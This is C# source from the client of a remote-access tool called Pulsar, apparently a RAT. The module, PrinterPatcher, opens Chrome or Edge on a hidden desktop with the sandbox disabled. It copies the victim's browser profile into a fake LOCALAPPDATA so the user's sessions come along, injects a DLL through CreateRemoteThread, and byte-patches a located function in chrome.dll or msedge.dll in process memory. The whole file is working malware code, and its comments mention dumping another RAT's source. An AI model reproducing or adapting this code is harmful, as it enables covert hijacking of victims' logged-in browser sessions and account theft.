using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Pulsar.Client.LoggingAPI;

namespace Pulsar.Client.Helper.HVNC.Chromium
{
    //Massive credits to resist (printer) for coming up with this solution for me. I can confidently say I did little to nothing to help besides wait 30 minutes to open chrome in IDA.
    //If you steal this solution/patch please give credits lol. (To any cybersec professional reading this, I'm in desperate need of a job or internship I will do anything. Please.)
    //Also shoutout to PureRat for giving us the idea after we dumped the source to the stub. We saw how bad their solution was so we made this :sob:
    public class PrinterPatcher
    {
        private string ChromiumExePath { get; set; }
        private string ChromiumDllPath { get; set; }
        private string ChromiumInstallFolderPath { get; set; }
        private string ChromiumBrowserName { get; set; }
        private string RealAppData { get; set; } = null;
        private string FakeAppData { get; set; } = null;
        private string ChromiumDllName { get; set; } = null;

        private static readonly Dictionary<string, byte[]> DllPatches = new Dictionary<string, byte[]>(StringComparer.OrdinalIgnoreCase)
        {
            { "chrome.dll", new byte[] { 0x56, 0x48, 0x89, 0xCE, 0xB0, 0x01, 0x88, 0x06, 0x88, 0x46, 0x01, 0x5E, 0xC3 } },
            { "msedge.dll", new byte[] { 0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3 } }
        };

        private static readonly Dictionary<string, string> DllPatterns = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            { "chrome.dll", "56 48 83 EC 70 ?? ?? ?? ?? ?? 48 89 CE 48 8B 05 ?? ?? ?? ?? 48 31 E0 48 89 44 24 ?? ?? ?? ?? 48 8D 54 24" },
            //{ "msedge.dll", "41 56 56 57 53 48 81 EC 98 00 00 00 0F ?? ?? ?? ?? ?? ?? ?? 48 8B 05 ?? ?? ?? ?? 48 31 E0 48 89 44 24 78 49 BE" }
            { "msedge.dll", "41 56 56 57 53 48 81 EC 98 00 00 00 0F ?? ?? ?? ?? ?? ?? ?? 48 8B 05 ?? ?? ?? ?? 48 31 E0 48 89 44 24 78 49 BE AA AA AA AA AA AA AA AA 48 ?? ?? ?? ?? 4C ?? ?? 10 0F 28 ?? ?? ?? ?? ?? 0F ?? ?? 48 89 F1 E8 ?? ?? ?? ?? B9 E9 ?? ?? ?? 48 89 F2 E8 ?? ?? ?? ?? 48 8D ?? ?? ??" }
        };

        /// <summary>
        /// Creates a new PrinterPatcher instance
        /// </summary>
        /// <param name="chromeexepath">Path to chrome.exe</param>
        /// <param name="chromeInstallDir">Path to Chrome installation directory (containing version folders)</param>
        public PrinterPatcher(string chromeexepath, string chromeInstallDir, string globalBorwserName, string chromiumDllName)
        {
            if (string.IsNullOrEmpty(chromeexepath))
                throw new ArgumentNullException(nameof(chromeexepath));

            if (string.IsNullOrEmpty(chromeInstallDir))
                throw new ArgumentNullException(nameof(chromeInstallDir));

            ChromiumExePath = chromeexepath;

            ChromiumDllName = chromiumDllName;

            // Find the latest Chrome version folder with chrome.dll
            string latestVersionFolder = FindLatestChromeVersion(chromeInstallDir);

            if (string.IsNullOrEmpty(latestVersionFolder))
                throw new FileNotFoundException($"Could not find Chrome version folder in: {chromeInstallDir}");

            // basically the ChromiumBorwserName is just the name of the dir after PROGRAMFILES
            ChromiumBrowserName = globalBorwserName;

            ChromiumInstallFolderPath = latestVersionFolder;
            ChromiumDllPath = Path.Combine(ChromiumInstallFolderPath, chromiumDllName);

            ValidatePaths();
        }

        /// <summary>
        /// Validates that the specified paths exist
        /// </summary>
        private void ValidatePaths()
        {
            if (!File.Exists(ChromiumExePath))
                throw new FileNotFoundException($"Chrome executable not found at: {ChromiumExePath}");

            if (!File.Exists(ChromiumDllPath))
                throw new FileNotFoundException($"Chrome DLL not found at: {ChromiumDllPath}");
        }

        /// <summary>
        /// Finds the latest Chrome version folder that contains chrome.dll
        /// </summary>
        private string FindLatestChromeVersion(string chromeInstallDir)
        {
            try
            {
                if (!Directory.Exists(chromeInstallDir))
                    throw new DirectoryNotFoundException($"Chrome installation directory not found: {chromeInstallDir}");

                // find latest version dir
                List<string> versionFolders = new List<string>();

                foreach (string dir in Directory.EnumerateDirectories(chromeInstallDir))
                {
                    string folderName = Path.GetFileName(dir);
                    if (folderName.Length > 0 && char.IsDigit(folderName[0]))
                    {
                        string dllPath = Path.Combine(dir, ChromiumDllName);
                        LogToServer(dllPath);
                        if (File.Exists(dllPath))
                        {
                            versionFolders.Add(dir);
                        }
                    }
                }

                if (versionFolders.Count == 0)
                    return string.Empty;

                // get newest folder by creation time
                return versionFolders.OrderByDescending(dir => Directory.GetCreationTime(dir)).First();
            }
            catch (Exception ex)
            {
                LogToServer($"Error finding Chrome version: {ex.Message}");
                return string.Empty;
            }
        }

        /// <summary>
        /// Converts a file offset to a Relative Virtual Address (RVA)
        /// </summary>
        /// <param name="filePath">Path to the DLL or EXE file</param>
        /// <param name="fileOffset">The file offset to convert</param>
        /// <returns>The RVA corresponding to the file offset, or 0 if conversion fails</returns>
        public static uint FileOffsetToRVA(string filePath, uint fileOffset)
        {
            // I admit when I'm defeated. This is 100% chatGPT. We were able to figure out offsets but not the RVA portion and automating a way to get the offset. (Thank you gpt4.1).
            try
            {
                LogToServer($"FileOffsetToRVA called for '{filePath}', fileOffset=0x{fileOffset:X}");

                if (!File.Exists(filePath))
                {
                    LogToServer($"ERROR: File '{filePath}' does not exist");
                    return 0;
                }

                byte[] fileData = File.ReadAllBytes(filePath);
                LogToServer($"Read {fileData.Length} bytes from file"); if (fileData.Length < 64)
                {
                    LogToServer("ERROR: File is too small to be a valid PE file");
                    return 0;
                }

                // Read DOS header to find PE header offset
                uint peOffset = BitConverter.ToUInt32(fileData, 0x3C);
                LogToServer($"PE header offset: 0x{peOffset:X}");

                if (peOffset + 24 > fileData.Length)
                {
                    LogToServer("ERROR: Invalid PE header offset");
                    return 0;
                }

                // Verify PE signature
                uint peSignature = BitConverter.ToUInt32(fileData, (int)peOffset);
                LogToServer($"PE signature: 0x{peSignature:X} (should be 0x00004550)"); if (peSignature != 0x00004550)  // "PE\0\0"
                {
                    LogToServer("ERROR: Invalid PE signature");
                    return 0;
                }

                // Get number of sections
                ushort numSections = BitConverter.ToUInt16(fileData, (int)peOffset + 6);
                LogToServer($"Number of sections: {numSections}");

                // Get size of optional header
                ushort sizeOfOptionalHeader = BitConverter.ToUInt16(fileData, (int)peOffset + 20);
                LogToServer($"Size of Optional Header: {sizeOfOptionalHeader}");

                // Find section headers offset (PE header + size of FileHeader + size of OptionalHeader)
                uint sectionHeadersOffset = peOffset + 24 + sizeOfOptionalHeader;
                LogToServer($"Section headers offset: 0x{sectionHeadersOffset:X}");

                // Print section info for debugging
                for (int i = 0; i < numSections; i++)
                {
                    uint sectionOffset = sectionHeadersOffset + (uint)(i * 40); // Each section header is 40 bytes
                    if (sectionOffset + 40 > fileData.Length)
                    {
                        LogToServer($"ERROR: Section header {i + 1} extends beyond file size");
                        break;
                    }

                    // Section name (8 bytes)
                    string sectionName = Encoding.ASCII.GetString(fileData, (int)sectionOffset, 8).TrimEnd('\0');
                    uint virtualSize = BitConverter.ToUInt32(fileData, (int)sectionOffset + 8);
                    uint virtualAddress = BitConverter.ToUInt32(fileData, (int)sectionOffset + 12);
                    uint sizeOfRawData = BitConverter.ToUInt32(fileData, (int)sectionOffset + 16);
                    uint pointerToRawData = BitConverter.ToUInt32(fileData, (int)sectionOffset + 20);

                    LogToServer($"Section {i + 1}: Name='{sectionName}', VirtualSize=0x{virtualSize:X}, VirtualAddress=0x{virtualAddress:X}, SizeOfRawData=0x{sizeOfRawData:X}, PointerToRawData=0x{pointerToRawData:X}");                    // Check if file offset is within this section
                    if (fileOffset >= pointerToRawData && fileOffset < pointerToRawData + sizeOfRawData)
                    {
                        uint offsetWithinSection = fileOffset - pointerToRawData;
                        uint rva = virtualAddress + offsetWithinSection;

                        LogToServer($"File offset 0x{fileOffset:X} found in section '{sectionName}' (#{i + 1})");
                        LogToServer($"Offset within section: 0x{offsetWithinSection:X}");
                        LogToServer($"Calculated RVA: 0x{rva:X}");

                        return rva;
                    }
                }

                LogToServer($"ERROR: File offset 0x{fileOffset:X} not found in any section");
                return 0;
            }
            catch (Exception ex)
            {
                LogToServer($"ERROR in FileOffsetToRVA: {ex.Message}");
                return 0;
            }
        }

        /// <summary>
        /// Finds the offset of the target function in the chrome.dll
        /// </summary>
        private int FindMatchOffset(byte[] src, string dllName)
        {
            if (!DllPatterns.TryGetValue(dllName, out string pattern))
                return 0;

            string[] patternSplit = pattern.Split(' ');
            byte[] newBytes = new byte[patternSplit.Length];
            List<int> wildcards = new List<int>();
            for (int i = 0; i < patternSplit.Length; i++)
            {
                string p = patternSplit[i];
                if (p == "??")
                {
                    wildcards.Add(i);
                    newBytes[i] = 0;
                }
                else
                {
                    newBytes[i] = Convert.ToByte(p, 16);
                }
            }

            List<int> foundOffsets = new List<int>();
            for (int i = 0; i <= src.Length - newBytes.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < newBytes.Length; j++)
                {
                    if (!wildcards.Contains(j) && src[i + j] != newBytes[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match)
                    foundOffsets.Add(i);
            }

            if (foundOffsets.Count > 0)
            {
                LogToServer($"Pattern found {foundOffsets.Count} time(s) at offsets: {string.Join(", ", foundOffsets.Select(x => $"0x{x:X8}"))}");
                return foundOffsets[0];
            }
            else
            {
                LogToServer("Pattern not found.");
                return 0;
            }
        }

        /// <summary>
        /// Reads and returns the chrome.dll file as byte array
        /// </summary>
        private byte[] ReadChromeDll()
        {
            try
            {
                if (File.Exists(ChromiumDllPath))
                {
                    return File.ReadAllBytes(ChromiumDllPath);
                }

                LogToServer($"ERROR: Chrome DLL not found at '{ChromiumDllPath}'");
                return new byte[0];
            }
            catch (Exception ex)
            {
                LogToServer($"ERROR reading Chrome DLL: {ex.Message}");
                return new byte[0];
            }
        }

        private void DirectoryCopy(string sourceDirName, string destDirName)
        {
            var dir = new DirectoryInfo(sourceDirName);
            if (!dir.Exists)
                throw new DirectoryNotFoundException($"Source directory not found: {sourceDirName}");

            if (!Directory.Exists(destDirName))
                Directory.CreateDirectory(destDirName);

            var files = dir.GetFiles();
            var dirs = dir.GetDirectories();

            Parallel.ForEach(files, file =>
            {
                string temppath = Path.Combine(destDirName, file.Name);
                try
                {
                    file.CopyTo(temppath, false);
                }
                catch (Exception ex)
                {
                    LogToServer($"ERROR copying file '{file.FullName}' to '{temppath}': {ex.Message}"); // Log the error
                }
            });

            Parallel.ForEach(dirs, subdir =>
            {
                string temppath = Path.Combine(destDirName, subdir.Name);
                DirectoryCopy(subdir.FullName, temppath);
            });
        }

        private void EnableEnvironmentVariableFucker()
        {
            RealAppData = Environment.GetEnvironmentVariable("LOCALAPPDATA");
            FakeAppData = Environment.GetEnvironmentVariable("TEMP") + "\\FakeAppData";
            if (Directory.Exists(FakeAppData)) Directory.Delete(FakeAppData, true);
            Directory.CreateDirectory(FakeAppData);
            DirectoryCopy(RealAppData + ChromiumBrowserName, FakeAppData + ChromiumBrowserName);
            LogToServer($"Cloned '{RealAppData + ChromiumBrowserName}' to '{FakeAppData + ChromiumBrowserName}'");
            Environment.SetEnvironmentVariable("LOCALAPPDATA", FakeAppData);
            LogToServer("Overrided %LOCALAPPDATA% environment variable");
        }

        private void DisableEnvironmentVariableFucker()
        {
            Environment.SetEnvironmentVariable("LOCALAPPDATA", RealAppData);
            LogToServer("Restored %LOCALAPPDATA% environment variable");
        }

        private bool ApplyPatch(int pid, int offset, string dllName)
        {
            try
            {
                DllInjector.InjectDll(pid, ChromiumDllPath);
                LogToServer($"Loaded {dllName} into chrome process");

                Thread.Sleep(1000);

                IntPtr chromeDllBaseAddress = IntPtr.Zero;
                Process targetProcess = Process.GetProcessById(pid);
                targetProcess.Refresh();

                foreach (ProcessModule module in targetProcess.Modules)
                {
                    if (module.FileName.ToLower().Contains(dllName.ToLower()) ||
                        module.ModuleName.ToLower().Contains(dllName.ToLower()))
                    {
                        chromeDllBaseAddress = module.BaseAddress;
                        break;
                    }
                }

                if (chromeDllBaseAddress == IntPtr.Zero)
                    return false;

                string dllPath = Path.Combine(ChromiumInstallFolderPath, dllName);
                uint rva = FileOffsetToRVA(dllPath, (uint)offset);
                if (rva == 0)
                    return false;

                IntPtr targetFunction = IntPtr.Add(chromeDllBaseAddress, (int)rva);

                // Use the patch from the dictionary
                if (!DllPatches.TryGetValue(dllName, out var patchBytes))
                    return false;

                // Read the original bytes before patching
                byte[] originalBytes = new byte[patchBytes.Length];
                if (NativeMemory.ReadMemory(pid, targetFunction, originalBytes))
                {
                    // Print original bytes
                    StringBuilder originalHex = new StringBuilder();
                    foreach (byte b in originalBytes)
                    {
                        originalHex.AppendFormat("0x{0:X2} ", b);
                    }
                    LogToServer($"Original bytes at target location ({originalBytes.Length} bytes):");
                    LogToServer($"{originalHex}");
                }
                else
                {
                    LogToServer("Failed to read original bytes from target location");
                }

                // Print patch bytes
                StringBuilder bytesHex = new StringBuilder();
                foreach (byte b in patchBytes)
                {
                    bytesHex.AppendFormat("0x{0:X2} ", b);
                }

                LogToServer($"Patch bytes to be applied ({patchBytes.Length} bytes):");
                LogToServer($"{bytesHex}");

                int bytesWritten = NativeMemory.WriteMemory(pid, targetFunction, patchBytes);
                return bytesWritten == patchBytes.Length;
            }
            catch (Exception ex)
            {
                LogToServer($"Error applying patch: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Starts Chrome with the patch applied
        /// </summary>
        public void Start()
        {
            // Get the version folder name (e.g., "123.0.6312.86")
            string versionFolderName = Path.GetFileName(ChromiumInstallFolderPath);
            int majorVersion = 0;
            if (!string.IsNullOrEmpty(versionFolderName))
            {
                var parts = versionFolderName.Split('.');
                if (parts.Length > 0)
                    int.TryParse(parts[0], out majorVersion);
            }

            LogToServer($"Detected Chrome version: {versionFolderName} (major version: {majorVersion})");

            if (majorVersion > 0 && majorVersion <= 135)
            {
                // No patch needed, just start Chrome normally
                LogToServer($"Chrome version {majorVersion} detected, skipping patch.");
                int goodVerPID = ProcessHelper.CreateSuspendedProcess(ChromiumExePath, "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized");
                Thread.Sleep(500);
                ProcessHelper.ResumeProcess(goodVerPID);
                return;
            }

            // Determine DLL name from path
            string dllName = Path.GetFileName(ChromiumDllPath);

            byte[] dllBytes = ReadChromeDll();
            LogToServer($"Read {dllBytes.Length} bytes from {dllName}");
            if (dllBytes.Length == 0) return;

            int offset = FindMatchOffset(dllBytes, dllName);
            LogToServer($"Offset of {dllName} target function: {offset:X8}");
            if (offset == 0) return;

            EnableEnvironmentVariableFucker();
            int chromePid = ProcessHelper.CreateSuspendedProcess(ChromiumExePath, "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized");
            LogToServer($"Created suspended chrome process: {chromePid}");
            DisableEnvironmentVariableFucker();

            if (ApplyPatch(chromePid, offset, dllName))
            {
                LogToServer($"Applied patch to {dllName} in chrome process");
                ProcessHelper.ResumeProcess(chromePid);
                LogToServer("Resumed chrome process");
            }
            else
            {
                Process.GetProcessById(chromePid).Kill();
            }
        }

        private static void LogToServer(string message)
        {
            try
            {
                UniversalDebugLogger.SendLogToServer($"[PrinterPatcher] {message}");

                Debug.WriteLine($"[PrinterPatcher] {message}");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[PrinterPatcher] {message}");
                Debug.WriteLine($"[PrinterPatcher] Error sending log to server: {ex.Message}");
            }
        }
    }

    public static class NativeMemory
    {
        private const uint PROCESS_VM_WRITE = 0x0020;
        private const uint PROCESS_VM_OPERATION = 0x0008;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint PROCESS_VM_READ = 0x0010;

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            UIntPtr nSize,
            out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            UIntPtr nSize,
            out UIntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        public static bool ReadMemory(int pid, IntPtr baseAddress, byte[] buffer)
        {
            if (buffer == null || buffer.Length == 0)
                throw new ArgumentException("Buffer is null or empty.", nameof(buffer));

            IntPtr hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid); 
            if (hProcess == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                UniversalDebugLogger.SendLogToServer($"[PrinterPatcher] Failed to open process for reading: {new System.ComponentModel.Win32Exception(error).Message}");
                return false;
            }

            try
            {
                bool result = ReadProcessMemory(hProcess, baseAddress, buffer, (UIntPtr)buffer.Length, out UIntPtr bytesRead);
                
                if (!result || bytesRead.ToUInt32() != buffer.Length)
                {
                    int errorCode = Marshal.GetLastWin32Error();
                    UniversalDebugLogger.SendLogToServer($"[PrinterPatcher] Failed to read memory: {new System.ComponentModel.Win32Exception(errorCode).Message}");
                    return false;
                }

                return true;
            }
            finally
            {
                CloseHandle(hProcess);
            }
        }

        public static int WriteMemory(int pid, IntPtr baseAddress, byte[] data)
        {
            if (data == null || data.Length == 0)
                throw new ArgumentException("Data buffer is null or empty.", nameof(data));

            IntPtr hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                throw new System.ComponentModel.Win32Exception(error, "Failed to open target process.");
            }

            try
            {
                bool result = WriteProcessMemory(hProcess, baseAddress, data, (UIntPtr)data.Length, out UIntPtr bytesWritten);

                if (!result || bytesWritten.ToUInt32() != data.Length)
                {
                    int errorCode = Marshal.GetLastWin32Error();
                    throw new System.ComponentModel.Win32Exception(errorCode, "Failed to write memory to process.");
                }

                return (int)bytesWritten;
            }
            finally
            {
                CloseHandle(hProcess);
            }
        }
    }

    public static class DllInjector
    {
        private const uint PROCESS_CREATE_THREAD = 0x0002;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint PROCESS_VM_OPERATION = 0x0008;
        private const uint PROCESS_VM_WRITE = 0x0020;
        private const uint PROCESS_VM_READ = 0x0010;

        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_READWRITE = 0x04;

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] buffer, uint size, out UIntPtr numberOfBytesWritten);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess,
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
            IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        private const uint WAIT_OBJECT_0 = 0x00000000;
        private const uint INFINITE = 0xFFFFFFFF;

        public static void InjectDll(int pid, string dllPath)
        {
            if (!File.Exists(dllPath))
            {
                throw new FileNotFoundException($"DLL not found: {dllPath}");
            }

            IntPtr hProcess = OpenProcess(
                PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                false, pid);

            if (hProcess == IntPtr.Zero)
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "Failed to open process");

            try
            {
                // Convert path to absolute path
                string absolutePath = Path.GetFullPath(dllPath);
                byte[] dllPathBytes = Encoding.Unicode.GetBytes(absolutePath + "\0");

                Debug.WriteLine("> Injecting DLL: " + absolutePath);

                IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPathBytes.Length,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                if (allocMemAddress == IntPtr.Zero)
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "Failed to allocate memory in target process");

                Debug.WriteLine("> Allocated memory at: {0:X}", (ulong)allocMemAddress);

                if (!WriteProcessMemory(hProcess, allocMemAddress, dllPathBytes, (uint)dllPathBytes.Length, out UIntPtr bytesWritten))
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "Failed to write DLL path to target process memory");

                Debug.WriteLine("> Wrote {0} bytes to target process", bytesWritten);

                IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
                if (kernel32Handle == IntPtr.Zero)
                    throw new Exception("Failed to get handle for kernel32.dll");

                IntPtr loadLibraryAddr = GetProcAddress(kernel32Handle, "LoadLibraryW");
                if (loadLibraryAddr == IntPtr.Zero)
                    throw new Exception("Failed to get address of LoadLibraryW");

                Debug.WriteLine("> LoadLibraryW address: {0:X}", (ulong)loadLibraryAddr);

                IntPtr threadId;
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, out threadId);

                if (hThread == IntPtr.Zero)
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "Failed to create remote thread");

                Debug.WriteLine("> Created remote thread with ID: {0}", threadId);

                // Wait for the thread to complete
                uint waitResult = WaitForSingleObject(hThread, 5000); // 5 second timeout
                if (waitResult != WAIT_OBJECT_0)
                {
                    Debug.WriteLine("> Warning: Remote thread did not complete within timeout");
                }
                else
                {
                    Debug.WriteLine("> Remote thread completed successfully");
                }

                CloseHandle(hThread);
            }
            finally
            {
                CloseHandle(hProcess);
            }
        }
    }

    public class ProcessHelper
    {
        private const int THREAD_SUSPEND_RESUME = 0x0002;

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        private const uint TH32CS_SNAPTHREAD = 0x00000004;

        [StructLayout(LayoutKind.Sequential)]
        private struct THREADENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ThreadID;
            public uint th32OwnerProcessID;
            public int tpBasePri;
            public int tpDeltaPri;
            public uint dwFlags;
        }

        public static void ResumeProcess(int pid)
        {
            IntPtr snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if (snapshot == IntPtr.Zero)
                throw new Exception("Failed to create snapshot.");

            THREADENTRY32 threadEntry = new THREADENTRY32();
            threadEntry.dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32));

            bool foundThread = false;

            if (Thread32First(snapshot, ref threadEntry))
            {
                do
                {
                    if (threadEntry.th32OwnerProcessID == (uint)pid)
                    {
                        IntPtr threadHandle = OpenThread(THREAD_SUSPEND_RESUME, false, threadEntry.th32ThreadID);
                        if (threadHandle == IntPtr.Zero)
                            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());

                        uint suspendCount = ResumeThread(threadHandle);
                        if (suspendCount == unchecked((uint)-1))
                        {
                            CloseHandle(threadHandle);
                            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
                        }

                        CloseHandle(threadHandle);

                        foundThread = true;
                        break;
                    }
                } while (Thread32Next(snapshot, ref threadEntry));
            }

            CloseHandle(snapshot);

            if (!foundThread)
                throw new Exception($"No thread found for process with PID {pid}");
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        private const uint CREATE_SUSPENDED = 0x00000004;

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

        public static int CreateSuspendedProcess(string path, string arguments = null)
        {
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = "PulsarDesktop";
            PROCESS_INFORMATION pi = default;

            // default args to use
            if (string.IsNullOrEmpty(arguments))
            {
                //pretty sure I have to do this because the path being executed is the first one but its being ignored? not too sure.
                // there is probably a really good explanation for this but I'm lowkey too lazy to go look it up so this will do.
                arguments = "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized";
            }

            bool success = CreateProcess(
                path,
                arguments,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref si,
                ref pi
            );

            if (!success)
            {
                int error = Marshal.GetLastWin32Error();
                throw new System.ComponentModel.Win32Exception(error);
            }

            if (pi.hThread != IntPtr.Zero)
                CloseHandle(pi.hThread);
            if (pi.hProcess != IntPtr.Zero)
                CloseHandle(pi.hProcess);

            return pi.dwProcessId;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);
    }
}